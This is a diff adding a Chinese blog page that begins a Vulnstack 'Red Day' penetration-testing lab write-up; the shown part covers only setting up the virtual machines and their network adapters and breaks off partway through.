@@ -1,0 +1,322 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Vulnstack红日靶场(1) - Potat0w0</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Potat0w0"><meta name="msapplication-TileImage" content="/img/icon.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Potat0w0"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="红日靶场&amp;amp;内网学习"><meta property="og:type" content="blog"><meta property="og:title" content="Vulnstack红日靶场(1)"><meta property="og:url" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/"><meta property="og:site_name" content="Potat0w0"><meta property="og:description" content="红日靶场&amp;amp;内网学习"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413133850745.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413133612112.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417142022407.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413134120682.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413134216130.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413134335132.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413134710347.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413135637310.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413135705571.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413140754720.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413140148443.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413142456689.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413144818420.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413145901762.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413150123333.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413151043217.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413151205358.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413151446844.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413154409199.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413155127634.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413155326037.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413155215071.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413155438578.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413155530667.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413155547421.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417013039780.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417013821084.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417013633758.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417014400666.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418014301758.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418014420485.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417014758506.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417020936451.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417214812253.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417215120360.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417211334710.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417215821470.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417215916553.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418011259033.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418012944329.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240420015040195.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240420015255794.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240420015745707.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240420020755796.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240420020826903.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418021646274.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418022937256.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418023114838.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419032634232.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419033136422.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419194239021.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419202817777.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419203057197.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419203311823.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419204841662.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419204901032.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419203726668.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419205021082.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419213115556.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419213201854.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/37585dc61b7a057656f59d9a6508b0d3.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418212831028.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418214555316.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418214521355.png"><meta property="og:image" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419025706725.png"><meta property="article:published_time" content="2024-04-13T03:09:58.000Z"><meta property="article:modified_time" content="2024-05-05T18:01:36.838Z"><meta property="article:author" content="Potat0w0"><meta property="article:tag" content="内网渗透"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413133850745.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/"},"headline":"Vulnstack红日靶场(1)","image":["http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413133850745.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413133612112.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417142022407.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413134120682.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413134216130.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413134335132.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413134710347.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413135637310.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413135705571.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413140754720.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413140148443.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413142456689.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413144818420.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413145901762.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413150123333.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413151043217.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413151205358.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413151446844.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413154409199.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413155127634.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413155326037.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413155215071.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413155438578.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413155530667.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413155547421.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417013039780.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417013821084.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417013633758.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417014400666.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418014301758.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418014420485.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417014758506.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417020936451.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417214812253.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417215120360.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417211334710.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417215821470.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417215916553.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418011259033.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418012944329.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240420015040195.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240420015255794.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240420015745707.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240420020755796.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240420020826903.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418021646274.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418022937256.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418023114838.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419032634232.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419033136422.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419194239021.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419202817777.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419203057197.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419203311823.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419204841662.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419204901032.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419203726668.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419205021082.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419213115556.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419213201854.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/37585dc61b7a057656f59d9a6508b0d3.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418212831028.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418214555316.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418214521355.png","http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419025706725.png"],"datePublished":"2024-04-13T03:09:58.000Z","dateModified":"2024-05-05T18:01:36.838Z","author":{"@type":"Person","name":"Potat0w0"},"publisher":{"@type":"Organization","name":"Potat0w0","logo":{"@type":"ImageObject"}},"description":"红日靶场&amp;内网学习"}</script><link rel="canonical" href="http://potatowo233.github.io/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
+  (function () {
+      function switchTab() {
+          if (!location.hash) {
+            return;
+          }
+
+          const id = '#' + CSS.escape(location.hash.substring(1));
+          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
+          if (!$tabMenu) {
+            return;
+          }
+
+          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
+          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
+          Array.from($tabMenuContainer.querySelectorAll('a'))
+              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
+              .forEach($content => $content.classList.add('is-hidden'));
+
+          if ($tabMenu) {
+              $tabMenu.parentElement.classList.add('is-active');
+          }
+          const $activeTab = document.querySelector(id);
+          if ($activeTab) {
+              $activeTab.classList.remove('is-hidden');
+          }
+      }
+      switchTab();
+      window.addEventListener('hashchange', switchTab, false);
+  })();
+  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/rss.xml" title="Potat0w0" type="application/atom+xml">
+</head><body class="is-3-column"><script type="text/javascript" color="30,144,255" opacity="0.5" zIndex="-1" count="150" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">Potat0w0</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">主页</a><a class="navbar-item" href="/archives">时间轴</a><a class="navbar-item" href="/categories">归档</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">关于</a><a class="navbar-item" href="/link">友链</a><a class="navbar-item" href="/map">索引</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Follow_me" href="https://github.com/Potatowo233"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2024-04-13T03:09:58.000Z" title="2024/4/13 11:09:58">2024-04-13</time>发表</span><span class="level-item"><time dateTime="2024-05-05T18:01:36.838Z" title="2024/5/6 02:01:36">2024-05-06</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><span> / </span><a class="link-muted" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/">红日靶场</a></span><span class="level-item">22 分钟读完 (大约3374个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">Vulnstack红日靶场(1)</h1><div class="content"><!-- more -->
+
+<h2 id="Vmware导入主机"><a href="#Vmware导入主机" class="headerlink" title="Vmware导入主机"></a>Vmware导入主机</h2><ul>
+<li>攻击机kali linux</li>
+<li>Web服务器Windows7</li>
+<li>域控Windows2008</li>
+<li>域成员Windows2003</li>
+</ul>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><p>win7作为web服务器，需要外部能够访问，因此网卡需要走NAT，同样攻击机kali也要能够被外部(主要是反弹shell)访问以及访问win7，因此kali也走NAT。域控、域成员不接触外网，因此需要设置其网卡为仅主机模式(网段需与NAT的不同)，同时win7需要能够访问内网，因此win7也得配置一张仅主机模式的网卡</p>
+<p>首先配置一下网络编辑器，三台主机一开始都被分配了固定的ip网段<code>192.168.52.0/24</code>了，因此需要添加一张仅主机模式、子网地址为<code>192.168.52.0</code>的网卡</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413133850745.png"></p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413133612112.png"></p>
+<p>接下来是为四台主机配置网卡：</p>
+<p>Win7两张，一张内网一张外部访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">这里有本人踩过的坑，必须是网络适配器1是主机模式，适配器2是NAT。建议把预装的NAT改为自定义的，再添加一张新的设置为NAT，总之就是很玄学。。。更改设置的时候都处于关机状态，然后重开机<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417142022407.png"></p>
+<p>域控(Windows2008)一张，用于内网：</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413134120682.png"></p>
+<p>域成员(Windows2003)一张，用于内网：</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413134216130.png"></p>
+<p>kali一张，NAT用于访问win7的web服务：</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413134335132.png"></p>
+<p>win7把防火墙关闭一下：</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413134710347.png"></p>
+<p>最终的结果：</p>
+<ul>
+<li>win7能够ping通外部以及攻击机kali以及内网其他2台主机</li>
